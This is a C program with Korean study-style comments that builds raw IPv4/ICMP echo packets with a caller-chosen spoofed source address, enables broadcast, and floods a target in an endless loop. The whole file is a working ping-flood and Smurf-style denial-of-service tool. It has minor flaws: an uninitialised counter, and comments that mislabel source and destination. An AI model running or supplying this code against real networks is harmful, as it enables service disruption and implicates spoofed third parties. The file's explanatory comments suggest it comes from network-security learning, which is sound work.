#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <arpa/inet.h> 
 unsigned short in_cksum(unsigned short *ptr, int nbytes);
 int main(int argc, char **argv)
{
	if (argc < 3) 
	{
		printf("usage: %s <도착지 IP> <목적지 IP> [페이로드 크기]\n", argv[0]);
		exit(0);
	}
	
	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;
	
	saddr = inet_addr(argv[1]); // 문자열 행태를 숫자 형태로  
	daddr = inet_addr(argv[2]); // 문자열 행태를 숫자 형태로
	
	if (argc > 3)
	{
		payload_size = atoi(argv[3]);
	}

    //  어느 특정한 프로토콜 용의 전송 계층 포맷팅 없이 인터넷 프로토콜 패킷을 직접적으로 주고 받게 해주는 소켓
    // Raw 사용 network layer  을 다루기 위해서 raw socket 을 만들어아햠
    // ipproto_Raw 를 사용하면 계층 3과 직접 상호 작용 가능 
    // ip 패킷의 헤더와 페이로드를 편집할수 있다
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW); // 세번째 인자는 실제로 사용할 프로토콜, 
    if (sockfd < 0) 
	{
		perror("could not create socket");
		return (0);
	}
	
	int on = 1;
	
	
    // 소켓 세부 설정 
    // ip 프로토콜을 옵션을 가져온다 ? ,
	//IPPROTO_IP 레벨 옵션은 IP 프로토콜 코드에서 해석하여 처리 
    // IP_HDRINCL ( 확인 또는 변경할 옵션의 이름 ) // ON 이라는 옵션 정보를 전달 
	// TRUE로 설정하면 애플리케이션이 IP 헤더를 제공함을 나타냅니다
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}




    // 소켓 세부설정 
    /*setSocket 으로 소켓의 ip 헤더를 건드림 + 대역폭 설정 ??*/
	// SOL_SOCKET 레벨 의 so_BROADCAST 를 1로 (TRUE)
	// SO _ BROADCAST : 브로드 캐스트 사용 가능 여부 
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}


    // 페이로드 설정 
    // ip header (20 byte) + icmp header + 8byte + icmp 데이터 크기 변조
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    //패킷 크기만큼 동적으로 할당 
	char *packet = (char *) malloc (packet_size);
				   
	if (!packet) 
	{
		perror("out of memory");
		close(sockfd);
		return (0);
	}
	struct iphdr *ip = (struct iphdr *) packet; // ip 헤더를 가르키는 포인터
	struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr)); // imcp헤더를 가르키는 포인터

	memset (packet, 0, packet_size); // 패킷을 메모리를 0으로 초기화 

    //ip 헤더 수정
	ip->version = 4; // IPV4 사용
	ip->ihl = 5;      // ihl(IP Header Length) : 헤더의길이 (5x4 = 20Byte) (default)
	ip->tos = 0;	  // type of service 를 0 으로 설정 (normal)
	ip->tot_len = htons (packet_size); // 페이로드를 포함한 패킷의 길이
	ip->id = rand ();  // 분열이 일어난 후 , 다시 패킷을 조합할때의 조합번호 
	ip->frag_off = 0;   // 패킷의 단편화 여부 0- 있음
	ip->ttl = 255;    // time to live 225. 패킷이 라우터를 넘어 목적지 까지 살아남을 수 있는 시간 ( 최대)
	ip->protocol = IPPROTO_ICMP; // 상위 프로토콜 을 ICMP IP : 3계층 ICMP 4계층
	ip->saddr = saddr; // 도착지 ip 주소
	ip->daddr = daddr;  // 목적지 ip 주소
    //소켓 주소 와 구조체 설정 

    icmp->type = ICMP_ECHO; // echo Message 응답 (ping 응답)
	icmp->code = 0;         // 각 메세지 유형 마다 추가적인 세부정보 (0)
  	icmp->un.echo.sequence = rand(); // 요구 패킷의 순서, 원래라면 0부터 시작
  	icmp->un.echo.id = rand(); // : Ping 프로세스의 프로세스 ID  여러 개의 ping이 동일 호스트에서 실행되는 경우 응답을 식별할때 쓰인다.
    
	//checksum
	icmp->checksum = 0; 

	struct sockaddr_in servaddr; // 소켓의 주소 
	servaddr.sin_family = AF_INET; // AF_INET 사용 
	servaddr.sin_addr.s_addr = daddr;  // 수락하기로 동의한 주소에 대한 정보를 daddr (즉 도착지에서 오는 것만 받음 ?)
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

	puts("flooding...");


	while (1) {

     memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size); // 페이로드의 값을 임의의 문자열로 
		
		//recalculate the icmp header checksum since we are filling the payload with random characters everytime
		//우리는 매번 임의의 문자로 페이로드를 채우고 있기 때문에 icmp 헤더 체크섬을 다시 계산한다.
		
		icmp->checksum = 0;
		icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
		
		// 
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
		{
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);
		
		usleep(10000);	//microseconds
	}
	
	free(packet);
	close(sockfd);
	
	return (0);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}
